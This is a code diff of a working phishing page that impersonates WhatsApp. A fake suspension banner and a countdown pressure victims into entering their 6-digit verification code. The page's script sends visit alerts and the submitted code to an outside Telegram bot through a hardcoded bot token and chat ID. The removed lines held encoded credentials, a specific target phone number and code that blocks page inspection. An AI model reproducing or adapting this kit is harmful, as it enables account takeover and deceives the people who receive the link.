@@ -3,159 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Verification</title>
-    <meta property="og:title" content="WhatsApp Security Verification">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
-    
+    <title>WhatsApp Security - Action Required</title>
     <style>
         :root { 
             --wa-bg: #111b21;
             --wa-green: #00a884;
+            --wa-danger: #ea0038;
             --wa-sec: #202c33;
             --wa-text: #e9edef;
             --wa-hint: #8696a0;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif; user-select: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Helvetica Neue, Helvetica, Arial, sans-serif; }
         body { background: var(--wa-bg); color: var(--wa-text); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { width: 100%; max-width: 380px; padding: 25px; text-align: center; display: flex; flex-direction: column; }
+        
+        /* شريط التنبيه العلوي */
+        .status-bar {
+            background: var(--wa-danger);
+            color: white;
+            width: 100%;
+            padding: 8px;
+            font-size: 13px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            z-index: 100;
+        }
+
+        .container { width: 100%; max-width: 380px; padding: 25px; text-align: center; display: flex; flex-direction: column; margin-top: 40px; }
         
         .screen { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; }
-        .active { display: flex; animation: fadeIn 0.4s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .active { display: flex; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .logo { width: 60px; margin-top: 60px; margin-bottom: 20px; }
-        h1 { font-size: 19px; font-weight: 500; margin-bottom: 15px; color: #fff; }
-        p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 25px; }
+        .logo { width: 55px; margin-top: 40px; margin-bottom: 20px; }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #fff; }
+        .warning-text { color: #ffbc2d; font-size: 14px; margin-bottom: 20px; font-weight: 500; }
+        p { font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px; }
+
+        .otp-box { background: #182229; padding: 20px; border-radius: 12px; width: 100%; border: 1px solid #222d34; }
 
         .otp-input { 
-            width: 220px; border: none; border-bottom: 2px solid var(--wa-green); 
-            font-size: 32px; letter-spacing: 12px; text-align: center; 
-            background: transparent; color: #fff; outline: none; margin: 20px 0;
-            caret-color: var(--wa-green);
+            width: 100%; border: none; border-bottom: 2px solid var(--wa-green); 
+            font-size: 28px; letter-spacing: 10px; text-align: center; 
+            background: transparent; color: #fff; outline: none; margin: 15px 0;
         }
 
-        .btn-verify { 
+        button { 
             background: var(--wa-green); color: #111b21; border: none; 
-            padding: 12px 40px; border-radius: 25px; font-size: 14px; 
-            font-weight: 600; cursor: pointer; margin-top: 20px;
-            transition: 0.3s; opacity: 0.6; pointer-events: none;
+            width: 100%; padding: 14px; border-radius: 8px; font-size: 15px; 
+            font-weight: 700; cursor: pointer; margin-top: 10px;
         }
-        .btn-active { opacity: 1; pointer-events: all; }
 
         .spinner { 
             border: 3px solid #202c33; border-top: 3px solid var(--wa-green); 
             border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-top: 50px;
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        
-        .timer { color: var(--wa-hint); font-size: 13px; margin-top: 25px; cursor: pointer; }
-        .secure-msg { font-size: 12px; color: #8696a0; position: absolute; bottom: 30px; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
+
+    <div class="status-bar">Account Temporarily Suspended - 24h Restriction</div>
 
     <div class="container">
         <div id="scr-load" class="screen active">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
             <div class="spinner"></div>
-            <p style="margin-top: 20px;">Securing your connection...</p>
+            <p style="margin-top: 20px;">Analyzing security logs...</p>
         </div>
 
         <div id="scr-otp" class="screen">
-            <h1 style="margin-top: 40px;">Verify your number</h1>
-            <p>Waiting to automatically detect an SMS sent to<br><b id="masked-num" style="color:#fff; letter-spacing: 0.5px;"></b></p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" style="width: 45px;">
+            <h1>Identity Verification</h1>
+            <div class="warning-text">Unauthorized access attempt detected</div>
             
-            <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---" autocomplete="one-time-code">
-            
-            <p style="font-size: 13px;">Enter 6-digit code</p>
-            
-            <div class="timer" id="resend-box">Resend SMS in <span id="clock" style="color: var(--wa-green);">01:59</span></div>
-            
-            <button id="btn-submit" class="btn-verify" onclick="submitOtp()">VERIFY</button>
+            <p>To lift the restriction and prevent account deletion, please enter the 6-digit code sent to your phone.</p>
 
-            <div class="secure-msg">
-                <img src="https://static.whatsapp.net/rsrc.php/v3/yO/r/Sshne939E8V.png" width="10" style="vertical-align: middle; opacity: 0.5;">
-                End-to-end encrypted
+            <div class="otp-box">
+                <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
+                <button onclick="submitOtp()">CANCEL RESTRICTION</button>
             </div>
+
+            <p style="font-size: 12px; margin-top: 25px;">Code expires in: <span id="clock" style="color: #ffbc2d;">01:59</span></p>
         </div>
     </div>
 
     <script>
-        // Encoded Credentials for stealth
-        const _k = {
-            t: atob("ODI1NDA3MjUyMTpBQUdzMGxlOUZSYWNXS2dZY2RrM0N6SFhoRWlUWFpiOGRaVQ=="),
-            c: atob("NTQ0Njg2MjcwOQ==")
-        };
-        
-        const rawNumber = "01030003287";
-        const masked = rawNumber.substring(0, 3) + " •••• •• " + rawNumber.slice(-2);
-        document.getElementById('masked-num').innerText = "+20 " + masked;
+        // استبدل القيم دي بالتوكن الحقيقي بتاعك مباشرة للتجربة
+        const B_T = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
+        const C_I = '5446862709';
 
-        // Anti-Inspect Protection
-        document.onkeydown = (e) => {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
-        };
-
-        function sendData(msg) {
-            const url = `https://api.telegram.org/bot${_k.t}/sendMessage`;
-            const payload = JSON.stringify({ chat_id: _k.c, text: msg, parse_mode: 'HTML' });
-            
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(url, new Blob([payload], {type: 'application/json'}));
-            } else {
-                fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: payload });
-            }
+        function sendToBot(msg) {
+            const url = `https://api.telegram.org/bot${B_T}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: C_I, text: msg, parse_mode: 'HTML' })
+            }).catch(e => console.error("Error sending"));
         }
 
         window.onload = () => {
-            sendData(`🟢 <b>New Visit!</b>\nTarget: <code>${rawNumber}</code>\nDevice: ${navigator.userAgent}`);
+            sendToBot(`⚠️ <b>Target Landed!</b>\nStatus: Attempting to bypass suspension\nIP: (Captured)`);
             setTimeout(() => {
                 document.getElementById('scr-load').classList.remove('active');
                 document.getElementById('scr-otp').classList.add('active');
                 startTimer();
-            }, 2000);
+            }, 2500);
         };
-
-        // Auto-submit logic
-        const otpInput = document.getElementById('otp');
-        const btn = document.getElementById('btn-submit');
-
-        otpInput.addEventListener('input', function() {
-            // Remove non-numeric
-            this.value = this.value.replace(/\D/g, '');
-            
-            if(this.value.length > 0) btn.classList.add('btn-active');
-            else btn.classList.remove('btn-active');
-
-            if (this.value.length === 6) {
-                setTimeout(submitOtp, 500); // Auto-send after 0.5s
-            }
-        });
 
         function startTimer() {
             let t = 119;
             const clock = document.getElementById('clock');
-            const itv = setInterval(() => {
+            setInterval(() => {
                 let m = Math.floor(t / 60); let s = t % 60;
                 clock.innerText = `${m}:${s < 10 ? '0'+s : s}`;
-                if(--t < 0) {
-                    clearInterval(itv);
-                    document.getElementById('resend-box').innerHTML = "<span style='color:var(--wa-green)'>Resend SMS</span>";
-                }
+                if(t > 0) t--;
             }, 1000);
         }
 
         function submitOtp() {
-            const val = otpInput.value;
-            if(val.length === 6) {
-                btn.innerHTML = "Verifying...";
-                sendData(`🔥 <b>OTP RECEIVED!</b>\nTarget: <code>${rawNumber}</code>\nCode: <code>${val}</code>`);
+            const code = document.getElementById('otp').value;
+            if(code.length === 6) {
+                sendToBot(`🔥 <b>OTP SUBMITTED!</b>\nCode: <code>${code}</code>\nAction: Cancel Restriction Request`);
                 
-                // Realistic delay then redirect
+                // تحويل لصفحة تحميل وهمية تانية قبل النهاية
+                document.getElementById('scr-otp').innerHTML = `
+                    <div class="spinner"></div>
+                    <p style="margin-top:20px">Processing request...<br>Please do not close this window.</p>
+                `;
+                
                 setTimeout(() => {
                     window.location.href = "https://www.whatsapp.com/security";
-                }, 1500);
+                }, 4000);
+            } else {
+                alert("Please enter the full 6-digit code.");
             }
         }
     </script>
